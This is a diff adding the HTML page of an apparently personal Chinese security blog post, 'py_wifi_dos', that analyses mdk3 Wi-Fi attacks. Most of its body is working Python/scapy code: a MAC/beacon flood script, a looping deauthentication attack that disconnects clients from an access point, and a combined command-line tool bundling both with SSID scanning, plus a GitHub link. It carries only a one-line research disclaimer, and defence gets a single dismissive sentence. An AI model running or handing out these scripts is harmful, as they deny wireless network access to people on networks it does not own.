@@ -1,0 +1,301 @@
+<!DOCTYPE html>
+<html lang=九世>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="前言距离放寒假还有10天左右，这个星期继续在实验室折腾。突然对mdk3感兴趣，然后逐步了解写出一个脚本。 提醒：本文仅安全研究学习，若是违法被抓作者不负责 分析mdk3的攻击先开启网卡监听模式1airmon-ng start &amp;lt;iface&amp;gt; 首先是Mac洪水攻击：1mdk3 &amp;lt;iface&amp;gt; a -a &amp;lt;bssid&amp;gt; 没攻击之前： 攻击中 wireshark抓到的">
+<meta name="keywords" content="Writing">
+<meta property="og:type" content="article">
+<meta property="og:title" content="py_wifi_dos">
+<meta property="og:url" content="http://yoursite.com/2019/01/04/py-wifi-dos/index.html">
+<meta property="og:site_name" content="九世的博客">
+<meta property="og:description" content="前言距离放寒假还有10天左右，这个星期继续在实验室折腾。突然对mdk3感兴趣，然后逐步了解写出一个脚本。 提醒：本文仅安全研究学习，若是违法被抓作者不负责 分析mdk3的攻击先开启网卡监听模式1airmon-ng start &amp;lt;iface&amp;gt; 首先是Mac洪水攻击：1mdk3 &amp;lt;iface&amp;gt; a -a &amp;lt;bssid&amp;gt; 没攻击之前： 攻击中 wireshark抓到的">
+<meta property="og:locale" content="九世">
+<meta property="og:image" content="http://pic.netbian.com/uploads/allimg/171111/221348-151040962861e7.jpg">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/04/FT2zPU.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/04/FTRPM9.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/04/FTR5e1.md.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/04/FTRLSe.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/04/FTWewq.md.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/04/FTWUk6.md.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/04/FTW60I.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/04/FTWH7q.md.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/04/FTf0U0.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/04/FTfs8U.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/04/FTfjat.md.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/04/FThEaq.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/04/FThMM4.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/04/FThMM4.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/04/FThYi6.png">
+<meta property="og:updated_time" content="2019-01-04T13:16:40.883Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="py_wifi_dos">
+<meta name="twitter:description" content="前言距离放寒假还有10天左右，这个星期继续在实验室折腾。突然对mdk3感兴趣，然后逐步了解写出一个脚本。 提醒：本文仅安全研究学习，若是违法被抓作者不负责 分析mdk3的攻击先开启网卡监听模式1airmon-ng start &amp;lt;iface&amp;gt; 首先是Mac洪水攻击：1mdk3 &amp;lt;iface&amp;gt; a -a &amp;lt;bssid&amp;gt; 没攻击之前： 攻击中 wireshark抓到的">
+<meta name="twitter:image" content="http://pic.netbian.com/uploads/allimg/171111/221348-151040962861e7.jpg">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>py_wifi_dos</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="http://github.com/422926799">Projectes</a></li>
+         
+          <li><a href="/Search">Search</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2018/12/22/Windows-Low-Privilege-Arbitrary-File-Reading/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Post Anterior</span>
+      <span id="i-next" class="info" style="display:none;">Post Següent</span>
+      <span id="i-top" class="info" style="display:none;">Adalt</span>
+      <span id="i-share" class="info" style="display:none;">Compartir Post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2019/01/04/py-wifi-dos/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2019/01/04/py-wifi-dos/&text=py_wifi_dos"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2019/01/04/py-wifi-dos/&title=py_wifi_dos"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2019/01/04/py-wifi-dos/&is_video=false&description=py_wifi_dos"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=py_wifi_dos&body=Check out this article: http://yoursite.com/2019/01/04/py-wifi-dos/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2019/01/04/py-wifi-dos/&title=py_wifi_dos"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2019/01/04/py-wifi-dos/&title=py_wifi_dos"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2019/01/04/py-wifi-dos/&title=py_wifi_dos"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2019/01/04/py-wifi-dos/&title=py_wifi_dos"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2019/01/04/py-wifi-dos/&name=py_wifi_dos&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#分析mdk3的攻击"><span class="toc-number">2.</span> <span class="toc-text">分析mdk3的攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#代码集合体"><span class="toc-number">3.</span> <span class="toc-text">代码集合体</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-number">4.</span> <span class="toc-text">总结</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index my4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        py_wifi_dos
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">九世的博客</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2019-01-04T11:31:34.000Z" itemprop="datePublished">2019-01-04</time>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/Writing/">Writing</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>距离放寒假还有10天左右，这个星期继续在实验室折腾。突然对mdk3感兴趣，然后逐步了解写出一个脚本。</p>
+<p><b>提醒：本文仅安全研究学习，若是违法被抓作者不负责</b><br><img src="http://pic.netbian.com/uploads/allimg/171111/221348-151040962861e7.jpg" alt="221348-151040962861e7.jpg"></p>
+<h2 id="分析mdk3的攻击"><a href="#分析mdk3的攻击" class="headerlink" title="分析mdk3的攻击"></a>分析mdk3的攻击</h2><p>先开启网卡监听模式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airmon-ng start &lt;iface&gt;</span><br></pre></td></tr></table></figure></p>
+<p>首先是<b>Mac洪水攻击</b>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mdk3 &lt;iface&gt; a -a &lt;bssid&gt;</span><br></pre></td></tr></table></figure></p>
+<p>没攻击之前：<br><img src="https://s2.ax1x.com/2019/01/04/FT2zPU.png" alt="FT2zPU.png"></p>
+<p>攻击中<br><img src="https://s2.ax1x.com/2019/01/04/FTRPM9.png" alt="FTRPM9.png"></p>
+<p>wireshark抓到的包:<br><img src="https://s2.ax1x.com/2019/01/04/FTR5e1.md.png" alt="FTR5e1.md.png"></p>
+<p><img src="https://s2.ax1x.com/2019/01/04/FTRLSe.png" alt="FTRLSe.png"></p>
+<p>分析<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Receiver address： 接收地址（Client）</span><br><span class="line">Destination address：目的地地址（Client）</span><br><span class="line">Transmitter address：发射地址（AP）</span><br><span class="line">BSSID：BSSID</span><br></pre></td></tr></table></figure></p>
+<p>猜想：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MAC水攻击也就是生成批量的MAC的地址，然后构造请求AP验证的数据包</span><br><span class="line">（也就是说只有请求包，不需要构造响应包）</span><br></pre></td></tr></table></figure></p>
+<p>所以一和二为一样的，接着去scapy找对应的函数。<br><img src="https://s2.ax1x.com/2019/01/04/FTWewq.md.png" alt="FTWewq.md.png"><br><img src="https://s2.ax1x.com/2019/01/04/FTWUk6.md.png" alt="FTWUk6.md.png"></p>
+<p>合三为一查看帮助：<br><img src="https://s2.ax1x.com/2019/01/04/FTW60I.png" alt="FTW60I.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">RadioTap()经过对比，发现可以保持默认即可</span><br><span class="line">Dot11() 里的addr1填目标MAC地址，这里全部客户端攻击填写：FF:FF:FF:FF:FF:FF或者填指定的MAC</span><br><span class="line">addr2和addr3填AP地址</span><br><span class="line">Dot11Beacon() 保持默认或自行更改</span><br></pre></td></tr></table></figure>
+<p>MAC洪水攻击代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">@author:九世</span><br><span class="line">@time:2019/1/3</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">from scapy.all import *</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line">n=[]</span><br><span class="line">m=[]</span><br><span class="line"></span><br><span class="line">yser=input(&quot;RMAC:&quot;)</span><br><span class="line"></span><br><span class="line">def dos(mac):</span><br><span class="line">    for k in range(65, 71):</span><br><span class="line">        n.append(chr(k))</span><br><span class="line"></span><br><span class="line">    for q in range(0, 9):</span><br><span class="line">        m.append(q)</span><br><span class="line">    #批量生成MAC</span><br><span class="line">    for v in n:</span><br><span class="line">        for l in m:</span><br><span class="line">            for k in n:</span><br><span class="line">                for w in m:</span><br><span class="line">                    for s in n:</span><br><span class="line">                        for mq in m:</span><br><span class="line">                            for q in n:</span><br><span class="line">                                for p in m:</span><br><span class="line">                                    for o in n:</span><br><span class="line">                                        for g in m:</span><br><span class="line">                                            for we in n:</span><br><span class="line">                                                for wq in m:</span><br><span class="line">                                                    macs = &quot;&#123;&#125;&#123;&#125;:&#123;&#125;&#123;&#125;:&#123;&#125;&#123;&#125;:&#123;&#125;&#123;&#125;:&#123;&#125;&#123;&#125;:&#123;&#125;&#123;&#125;&quot;.format(v, l, k, w, s, mq, q,p, o, g, we, wq)</span><br><span class="line">                                                    data=RadioTap()/Dot11(subtype=11,addr1=&quot;ff:ff:ff:ff:ff:ff&quot;,addr2=&quot;&#123;&#125;&quot;.format(macs),addr3=mac,addr4=mac)/Dot11Beacon(timestamp=70180) #构造数据包</span><br><span class="line">                                                    sendp(data,iface=&quot;mon0&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    t=threading.Thread(target=dos,args=(&quot;&#123;&#125;&quot;.format(yser),))</span><br><span class="line">    t.start()</span><br></pre></td></tr></table></figure>
+<p>攻击效果：<br><img src="https://s2.ax1x.com/2019/01/04/FTWH7q.md.png" alt="FTWH7q.md.png"></p>
+<p><b>Deauch attack攻击</b></p>
+<blockquote>
+<p>Deauch攻击就是伪造AP断开连接的数据包发送给AP还有客户端。造成无法连接到网络</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过刚刚说的话可以获得一个关键信息，我们要构造两个数据包。一个发送给AP一个发送给客户实现欺骗。</span><br></pre></td></tr></table></figure>
+<p>wireshark抓包分析</p>
+<p><img src="https://s2.ax1x.com/2019/01/04/FTf0U0.png" alt="FTf0U0.png"></p>
+<p>欺骗AP<br><img src="https://s2.ax1x.com/2019/01/04/FTfs8U.png" alt="FTfs8U.png"></p>
+<p>那么用到的scapy函数如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RadioTap()/Dot11()/Dot11Deauth()</span><br></pre></td></tr></table></figure>
+<p>demo代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from scapy.all import *</span><br><span class="line"></span><br><span class="line">#构造一个发送给客户端的包和一个给AP的包</span><br><span class="line">while True:</span><br><span class="line">    deauth_pkt1 = RadioTap()/Dot11(addr1=&quot;ff:ff:ff:ff:ff:ff&quot;, addr2=&quot;&lt;you MAC&gt;&quot;, addr3=&quot;&lt;you MAC&gt;&quot;) / Dot11Deauth()</span><br><span class="line">    deauth_pkt2 = RadioTap()/Dot11(addr1=&quot;&lt;you MAC&gt;&quot;, addr2=&quot;ff:ff:ff:ff:ff:ff&quot;, addr3=&quot;ff:ff:ff:ff:ff:ff&quot;) / Dot11Deauth()</span><br><span class="line">    sendp(deauth_pkt1,iface=&quot;mon0&quot;)</span><br><span class="line">    sendp(deauth_pkt2,iface=&quot;mon0&quot;)</span><br></pre></td></tr></table></figure></p>
+<p>测试结果：<br><img src="https://s2.ax1x.com/2019/01/04/FTfjat.md.png" alt="FTfjat.md.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">手机也有一个测试但是没有视频很难看出效果，给我师父可以拿代码自行测试</span><br></pre></td></tr></table></figure>
+<h2 id="代码集合体"><a href="#代码集合体" class="headerlink" title="代码集合体"></a>代码集合体</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">由于当事人的能力不足，导致自己处于不利的地位 --《小黑发金木*金木*340号 金木*小白发金木*佐佐木 绯世*黑色死神 金木*独眼之王 金木*天使形态 金木》</span><br></pre></td></tr></table></figure>
+<p>代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line">&apos;&apos;&apos;</span><br><span class="line">@author:jiushi</span><br><span class="line">@time:2019/1/4</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">#-*-coding:utf-8-*-</span><br><span class="line">from scapy.all import *</span><br><span class="line">import optparse</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">banner=&quot;&quot;&quot;</span><br><span class="line">signature:今生今世非你不娶</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">print(banner)</span><br><span class="line">print(&apos;[!] Reminder: This tool needs to install the airmon-ng tool.&apos;)</span><br><span class="line">print(&apos;&apos;)</span><br><span class="line">print(&apos;&apos;)</span><br><span class="line">print(&apos;1.Generate a large number of mac addresses for flood attacks&apos;)</span><br><span class="line">print(&apos;2.Dot11Deauch attack&apos;)</span><br><span class="line">print(&apos;3.SSID and MAC scan&apos;)</span><br><span class="line">print(&apos;4.NIC open monitor mode&apos;)</span><br><span class="line">print(&apos;&apos;)</span><br><span class="line">print(&apos;&apos;)</span><br><span class="line"></span><br><span class="line">mac_list=[]</span><br><span class="line">ssid_list=[]</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    parser=optparse.OptionParser()</span><br><span class="line">    parser.add_option(&apos;-r&apos;,dest=&apos;rmac&apos;,help=&apos;rhost_mac&apos;)</span><br><span class="line">    parser.add_option(&apos;-m&apos;,dest=&apos;macaddresses&apos;,help=&apos;mac addresses&apos;,action=&apos;store_true&apos;)</span><br><span class="line">    parser.add_option(&apos;-d&apos;,dest=&apos;deauch&apos;,help=&apos;Deauch attack&apos;,action=&apos;store_true&apos;)</span><br><span class="line">    parser.add_option(&apos;-s&apos;,dest=&apos;scan&apos;,help=&apos;ssid and macscan&apos;,action=&apos;store_true&apos;)</span><br><span class="line">    parser.add_option(&apos;-f&apos;,dest=&apos;iface&apos;,help=&apos;network iface&apos;,action=&apos;store&apos;)</span><br><span class="line">    parser.add_option(&apos;-t&apos;,dest=&apos;start&apos;,help=&apos;nic open monitor mode&apos;,action=&apos;store_true&apos;)</span><br><span class="line">    (options,args)=parser.parse_args()</span><br><span class="line">    if options.macaddresses and options.iface and options.rmac:</span><br><span class="line">        ifaces=options.iface</span><br><span class="line">        rsmac=options.rmac</span><br><span class="line">        mac_addresses(ifaces,rsmac)</span><br><span class="line">    elif options.deauch and options.iface and options.rmac:</span><br><span class="line">        iface2=options.iface</span><br><span class="line">        rs2mac=options.rmac</span><br><span class="line">        attack(iface2,rs2mac)</span><br><span class="line">    elif options.scan and options.iface:</span><br><span class="line">        iface3=options.iface</span><br><span class="line">        xj=open(&apos;save.txt&apos;,&apos;w&apos;)</span><br><span class="line">        xj.close()</span><br><span class="line">        print(&apos;[+] SSID scan:&apos;)</span><br><span class="line">        print(&apos;[!] Ctrl+C stop&apos;)</span><br><span class="line">        print(&apos;&apos;)</span><br><span class="line">        print(&apos;&apos;)</span><br><span class="line">        sniff(iface=iface3,prn=scan)</span><br><span class="line">    elif options.start and options.iface:</span><br><span class="line">        iface0=options.iface</span><br><span class="line">        start(iface0)</span><br><span class="line">    else:</span><br><span class="line">        parser.print_help()</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">def mac_addresses(iface1,rsmac):</span><br><span class="line">    print(&apos;[+] mac_addresses&apos;)</span><br><span class="line">    print(&apos;&apos;)</span><br><span class="line">    n=[]</span><br><span class="line">    m=[]</span><br><span class="line">    for k in range(65, 71):</span><br><span class="line">        n.append(chr(k))</span><br><span class="line"></span><br><span class="line">    for q in range(0, 9):</span><br><span class="line">        m.append(q)</span><br><span class="line">    for v in n:</span><br><span class="line">        for l in m:</span><br><span class="line">            for k in n:</span><br><span class="line">                for w in m:</span><br><span class="line">                    for s in n:</span><br><span class="line">                        for mq in m:</span><br><span class="line">                            for q in n:</span><br><span class="line">                                for p in m:</span><br><span class="line">                                    for o in n:</span><br><span class="line">                                        for g in m:</span><br><span class="line">                                            for we in n:</span><br><span class="line">                                                for wq in m:</span><br><span class="line">                                                    macss = &quot;&#123;&#125;&#123;&#125;:&#123;&#125;&#123;&#125;:&#123;&#125;&#123;&#125;:&#123;&#125;&#123;&#125;:&#123;&#125;&#123;&#125;:&#123;&#125;&#123;&#125;&quot;.format(v, l, k, w, s, mq, q,p, o, g, we, wq)</span><br><span class="line">                                                    data=RadioTap()/Dot11(subtype=11,addr1=&quot;ff:ff:ff:ff:ff:ff&quot;,addr2=&quot;&#123;&#125;&quot;.format(macss),addr3=rsmac,addr4=rsmac)/Dot11Beacon(timestamp=70180)</span><br><span class="line">                                                    sendp(data,iface=iface1)</span><br><span class="line"></span><br><span class="line">def attack(iface2,rs2mac):</span><br><span class="line">    print(&apos;[+] Dot11Deauth attak&apos;)</span><br><span class="line">    print(&apos;&apos;)</span><br><span class="line">    while True:</span><br><span class="line">        data2=RadioTap()/Dot11(addr1=&quot;ff:ff:ff:ff:ff:ff&quot;,addr2=rs2mac,addr3=rs2mac)/Dot11Deauth()</span><br><span class="line">        data3=RadioTap()/Dot11(addr1=rs2mac,addr2=&quot;ff:ff:ff:ff:ff:ff&quot;,addr3=&quot;ff:ff:ff:ff:ff:ff&quot;)/Dot11Deauth()</span><br><span class="line">        sendp(data2,iface=iface2)</span><br><span class="line">        sendp(data3,iface=iface2)</span><br><span class="line"></span><br><span class="line">def scan(jianting):</span><br><span class="line">    if jianting.haslayer(Dot11Elt):</span><br><span class="line">        if jianting.type==0 and jianting.subtype==8:</span><br><span class="line">            if not jianting.addr2 in mac_list:</span><br><span class="line">                mac_list.append(jianting.addr2)</span><br><span class="line">                ssid_list.append(jianting.info)</span><br><span class="line">                print(&apos;[+] MAC:&#123;&#125; SSID:&#123;&#125;&apos;.format(jianting.addr2,bytes.decode(jianting.info,encoding=&apos;utf-8&apos;)))</span><br><span class="line">                print(&apos;MAC:&#123;&#125; SSID:&#123;&#125;&apos;.format(jianting.addr2,bytes.decode(jianting.info,encoding=&apos;utf-8&apos;)),file=open(&apos;save.txt&apos;,&apos;a&apos;))</span><br><span class="line"></span><br><span class="line">def start(iface0):</span><br><span class="line">    print(&apos;[+] start mon&apos;)</span><br><span class="line">    print(&apos;&apos;)</span><br><span class="line">    print(&apos;&apos;)</span><br><span class="line">    os.system(&apos;sudo airmon-ng start &#123;&#125;&apos;.format(iface0))</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+<p>效果测试：<br>SSID扫描</p>
+<p><img src="https://s2.ax1x.com/2019/01/04/FThEaq.png" alt="FThEaq.png"></p>
+<p>MAC洪水攻击<br><img src="https://s2.ax1x.com/2019/01/04/FThMM4.png" alt="FThMM4.png"></p>
+<p>Deauch攻击<br><img src="https://s2.ax1x.com/2019/01/04/FThMM4.png" alt="FThMM4.png"></p>
+<p><img src="https://s2.ax1x.com/2019/01/04/FThYi6.png" alt="FThYi6.png"></p>
+<p>防止mdk3的攻击：有人说只能等协议更新有人说YouTube上防御教程。各位师父自行了解<br>github地址：<a href="https://github.com/422926799/python/tree/master/wifidos" target="_blank" rel="noopener">python/wifidos at master · 422926799/python · GitHub</a></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>当遇到需要分析数据包的时候耐心的对比和分析。去scapy寻找对应的协议函数，进行构造发送。不懂及时搜索。</p>
+<p>转载请声明：转自422926799.github.io</p>
+
+  </div>
+</article>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="http://github.com/422926799">Projectes</a></li>
+         
+          <li><a href="/Search">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#分析mdk3的攻击"><span class="toc-number">2.</span> <span class="toc-text">分析mdk3的攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#代码集合体"><span class="toc-number">3.</span> <span class="toc-text">代码集合体</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-number">4.</span> <span class="toc-text">总结</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2019/01/04/py-wifi-dos/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2019/01/04/py-wifi-dos/&text=py_wifi_dos"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2019/01/04/py-wifi-dos/&title=py_wifi_dos"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
